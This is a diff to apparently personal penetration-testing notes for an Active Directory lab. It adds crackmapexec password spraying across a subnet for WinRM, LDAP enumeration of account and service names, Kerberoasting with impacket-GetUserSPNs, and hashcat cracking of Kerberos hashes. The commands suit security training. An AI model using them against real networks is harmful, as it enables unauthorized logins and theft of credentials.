@@ -154,6 +154,7 @@ Port no 139 or 445 SMB
 			- sudo crackmapexec winrm 192.168.29.100 -u monah.bonita -p hello --continue-on-success
 			- sudo crackmapexec winrm 192.168.29.100 -u smbusers.txt -p password1.txt --continue-on-success | grep '(Pwn3d!)'
 			- sudo crackmapexec winrm 192.168.29.100 -u smbusers.txt -p /usr/share/seclists/Passwords/darkweb2017-top100.txt --continue-on-success | grep '(Pwn3d!)'
+			- sudo crackmapexec winrm 192.168.29.1/24 -u monah.bonita -p hello [this will login the users to every pc which is running winrm on it]
 
 
 Port no 5985 or 5986 Winrm
@@ -164,6 +165,26 @@ Port no 5985 or 5986 Winrm
 		- download link https://github.com/Hackplayers/evil-winrm
 	- evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!'  
 	- evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/' [-s can be used to run scripts] 
+
+
+Port Number 88 Kerberos
+
+	- first we will try to get the principal names from ldapsearch command which we have previously used.
+		- ldapsearch -x -H ldap://192.168.29.100 -s sub/base -b "dc=domain,dc=name" | grep userPrincipalName: | cut -d " " -f 2 > userPrincipalName.txt
+		- ldapsearch -x -H ldap://192.168.29.100 -s sub/base -b "dc=domain,dc=name" | grep sAMAccountName: | cut -d " " -f 2 > sAMAccountName.txt
+		- ldapserach -x -H ldap://192.168.29.100 -s sub/base -b "dc=domain,dc=name" | grep servicePrincipalName: | cut -d " " -f 2 > servicePrincipalName.txt
+
+	- using impacket-GetUserSPNs https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/
+		- impacket-GetUserSPNs domain/username:password -dc-ip <target_ip>
+		- impacket-GetUserSPNs armourinfosec.local/monah.bonita:hello -dc-ip 192.168.29.100
+		# this will give us the list of services
+
+		- impacket-GetUserSPNs domain/username:password -dc-ip <target_ip> -request
+		# this will give us the hashes of the services. 
+
+		# refer hashcat to crack the hash
+
+
 
 
 
@@ -178,6 +199,11 @@ Hash Cracking
 		- hashcat -h | grep <hashtype> [to look for the hash number which is used in the next command]
 
 		- hashcat -m 1800 -a 0 <path/to/hash> <path/to/rockyou> 
+
+
+	- kerberos hash crack
+		- hashcat --help | grep kerberos
+		- hashcat -m 13100 [or mode which you want] -a 0 <path/to/hash> <path/to/rockyou>
 
 
 In windows there are 4 ways to execute commands
